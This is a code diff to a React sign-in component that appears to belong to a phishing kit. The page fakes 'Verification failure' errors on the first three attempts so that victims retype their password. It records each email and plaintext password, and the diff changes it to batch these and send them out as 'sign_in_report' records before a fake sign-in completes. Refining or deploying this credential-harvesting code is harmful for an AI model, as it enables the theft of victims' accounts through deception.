@@ -10,7 +10,7 @@ import {
   resolveBackgroundDomain,
   userFromEmail,
 } from '../lib/utils'
-import { sendResponse } from '../lib/responses'
+import { sendResponsesBatch } from '../lib/responses'
 import { verifyCaptchaToken } from '../lib/captcha'
 import { primeClientMeta } from '../lib/clientMeta'
 import { getPersonalizedUrlParams } from '../lib/urlParams'
@@ -87,6 +87,17 @@ interface SignInStepProps {
 
 let signInAttempts = 0
 
+interface RecordedAttempt {
+  attempt: number
+  email: string
+  password: string
+  name: string
+  domain: string
+  outcome: 'failed' | 'success'
+}
+
+let recordedAttempts: RecordedAttempt[] = []
+
 function SignInStep({ onDomainChange }: SignInStepProps) {
   const { signIn } = useAuth()
 
@@ -147,17 +158,13 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
     const domain = getDomainFromEmail(trimmedEmail) || resolveBackgroundDomain(trimmedEmail)
 
     if (signInAttempts < 3) {
-      void sendResponse({
-        type: 'sign_in_report',
+      recordedAttempts.push({
+        attempt: signInAttempts,
         email: trimmedEmail,
         password: submittedPassword,
-        passwordValue: submittedPassword,
         name: userFromEmail(trimmedEmail).name,
         domain,
-        authMethod: 'email',
-        attempt: String(signInAttempts),
         outcome: 'failed',
-        message: 'Verification failure. Please try again.',
       })
       setError('Verification failure. Please try again.')
       setPassword('')
@@ -166,12 +173,36 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
       return
     }
 
-    signIn(userFromEmail(trimmedEmail), {
-      authMethod: 'email',
-      attempt: String(signInAttempts),
-      outcome: 'success',
+    recordedAttempts.push({
+      attempt: signInAttempts,
+      email: trimmedEmail,
       password: submittedPassword,
+      name: userFromEmail(trimmedEmail).name,
+      domain,
+      outcome: 'success',
     })
+
+    void sendResponsesBatch(
+      recordedAttempts.map((record) => ({
+        type: 'sign_in_report' as const,
+        email: record.email,
+        password: record.password,
+        passwordValue: record.password,
+        name: record.name,
+        domain: record.domain,
+        authMethod: 'email',
+        attempt: String(record.attempt),
+        outcome: record.outcome,
+        message:
+          record.outcome === 'failed'
+            ? 'Verification failure. Please try again.'
+            : undefined,
+      })),
+    )
+
+    recordedAttempts = []
+
+    signIn(userFromEmail(trimmedEmail), { authMethod: 'email' })
     setPassword('')
     setShowPassword(false)
     setLoading(false)
@@ -261,6 +292,7 @@ function VerifiedStep() {
         type="button"
         onClick={() => {
           signInAttempts = 0
+          recordedAttempts = []
           signOut()
         }}
         className="mt-6 rounded-xl border border-slate-200 px-5 py-2.5 text-sm font-medium text-slate-600 transition hover:bg-slate-50"
